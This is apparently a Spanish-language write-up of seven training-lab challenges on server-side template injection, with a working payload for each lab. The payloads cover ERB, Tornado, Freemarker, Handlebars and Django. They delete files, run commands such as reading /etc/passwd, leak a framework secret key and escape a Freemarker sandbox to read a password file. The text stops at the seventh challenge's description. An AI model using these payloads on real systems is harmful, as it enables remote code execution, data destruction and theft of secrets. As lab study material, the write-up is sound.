## Reto 1: Inyección básica de plantillas del lado del servidor

Este laboratorio es vulnerable a la inyección de plantillas del lado del servidor debido a la construcción insegura de una plantilla ERB.

Para resolver el laboratorio, revise la documentación de ERB para descubrir cómo ejecutar código arbitrario y luego elimine el morale.txt archivo del directorio de inicio de Carlos. 

Aprovechamos una vulnerabilidad de Server-Side Template Injection (SSTI) en Ruby (ERB), donde la aplicación evalúa contenido enviado por el usuario sin validación. Mediante la sintaxis de plantillas de ERB, demostramos la ejecución de código del lado servidor, logrando eliminar un archivo del sistema con un simple payload.

```
GET /?message=<%= File.delete("morale.txt") %> HTTP/2
```

## Reto 2:  Inyección básica de plantillas del lado del servidor (contexto del código)

Este laboratorio es vulnerable a la inyección de plantillas del lado del servidor debido a la forma en que utiliza de forma insegura una plantilla de Tornado. Para resolver el laboratorio, revise la documentación de Tornado para descubrir cómo ejecutar código arbitrario y luego elimine el archivo. morale.txt  del directorio de inicio de Carlos.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 

Esta vulnerabilidad de Server-Side Template Injection (SSTI) en el motor de plantillas Tornado. Mediante una combinación de sintaxis de plantillas y código Python embebido, conseguimos ejecutar comandos arbitrarios desde el servidor.

```
blog-post-author-display=user.first_name}}{%import os%}{{os.system('cat /etc/passwd')&csrf=CpgATskIw5lJLBFincXaqsU0jfeFGKA3
```

## Reto 3: Inyección de plantillas del lado del servidor mediante documentación

Este laboratorio es vulnerable a la inyección de plantillas del lado del servidor. Para solucionarlo, identifique el motor de plantillas y utilice la documentación para averiguar cómo ejecutar código arbitrario. Luego, elimine el morale.txt archivo del directorio de inicio de Carlos.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales:
content-manager:C0nt3ntM4n4g3r

Analizando la documentación oficial, identificamos la función ‘new()‘ como vector de ataque para instanciar clases peligrosas, como Execute, que permite lanzar comandos del sistema.

```
Only <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm morale.txt")} left of ${product.name} at ${product.price}.</p>
```

## Reto 4: nyección de plantilla del lado del servidor en un lenguaje desconocido con un exploit documentado

Este laboratorio es vulnerable a la inyección de plantillas del lado del servidor. Para solucionarlo, identifique el motor de plantillas y busque un exploit documentado en línea que pueda usar para ejecutar código arbitrario. Luego, elimine el... morale.txtarchivo del directorio de inicio de Carlos. 

una SSTI donde el motor de plantillas es desconocido. Mediante técnicas de fuzzing descubrimos que se trata de Handlebars, y aprovechamos un exploit documentado por la comunidad para ejecutar código en el servidor.

Comprbamos que en la URL cuando intentamos hacer esto {{7*7}} no da el siguiente error:

```
/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267 throw new Error(str); ^ Error: Parse error on line 1: {{7*7}} --^ Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID' at Parser.parseError (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267:19) at Parser.parse (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:336:30) at HandlebarsEnvironment.parse (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43) at compileInput (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19) at ret (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18) at [eval]:5:13 at Script.runInThisContext (node:vm:128:12) at Object.runInThisContext (node:vm:306:38) at node:internal/process/execution:83:21 at [eval]-wrapper:6:24 Node.js v19.8.1
```

Vemos que el motor de plantillas que se esta empleando es handlebars por lo tanto buscamos un exploit para este motor
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('rm morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

En la URL lo pegamos URL encodeado para que lo pueda interpretar y vemos como resolvemos el laboratorio.

## Reto 5: Inyección de plantillas del lado del servidor con divulgación de información a través de objetos proporcionados por el usuario

Este laboratorio es vulnerable a la inyección de plantillas del lado del servidor debido a la forma en que se pasa un objeto a la plantilla. Esta vulnerabilidad puede explotarse para acceder a datos confidenciales.

Para resolver el laboratorio, roba y envía la clave secreta del marco.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales:
content-manager:C0nt3ntM4n4g3r

Al igual que el ejemplo anterior podemos probar a producir un error y comprobar que plantilla se esta utilizando

Si ponemos {{7*7}} se produce el siguiente error:
```
Traceback (most recent call last): File "<string>", line 11, in <module> File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 191, in __init__ self.nodelist = self.compile_nodelist() File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 230, in compile_nodelist return parser.parse() File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 486, in parse raise self.error(token, e) django.template.exceptions.TemplateSyntaxError: Could not parse the remainder: '*7' from '7*7'
```
buscamos como podemos obtener la key:
```
<p>Hurry! Only {{settings.SECRET_KEY}} left of {{product.name}} at {{product.price}}.</p>
```
finalmente obtenemos la key:
```html
<p>Hurry! Only zfccsjo09s4anyxmd37rvw2jp3wlun66 left of Cheshire Cat Grin at $39.67.</p>
```

## Reto 6: Inyección de plantillas del lado del servidor en un entorno aislado


Este laboratorio utiliza el motor de plantillas Freemarker. Es vulnerable a la inyección de plantillas del lado del servidor debido a su entorno de pruebas mal implementado. Para resolver el laboratorio, salga del entorno de pruebas para leer el archivo. my_password.txt Desde el directorio personal de Carlos. Luego, envíe el contenido del archivo.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales:
content-manager:C0nt3ntM4n4g3r

```
<p>Hurry! Only ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
left of ${product.name} at ${product.price}.</p>
```

obtenemos la siguiente respuesta :
```
<p>Hurry! Only 50 114 121 54 103 55 116 50 101 116 121 103 107 50 54 115 102 104 109 53 left of Giant Pillow Thing at $25.17.</p> 
```

Si lo decodificamos de ASCII a Text obtenemos la siguiente contraseña:

```
2ry6g7t2etygk26sfhm5
```
## Reto 7: Inyección de plantilla del lado del servidor con un exploit personalizado

Este laboratorio es vulnerable a la inyección de plantillas del lado del servidor. Para solucionarlo, cree un exploit personalizado para eliminar el archivo. /.ssh/id_rsadel directorio de inicio de Carlos.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 
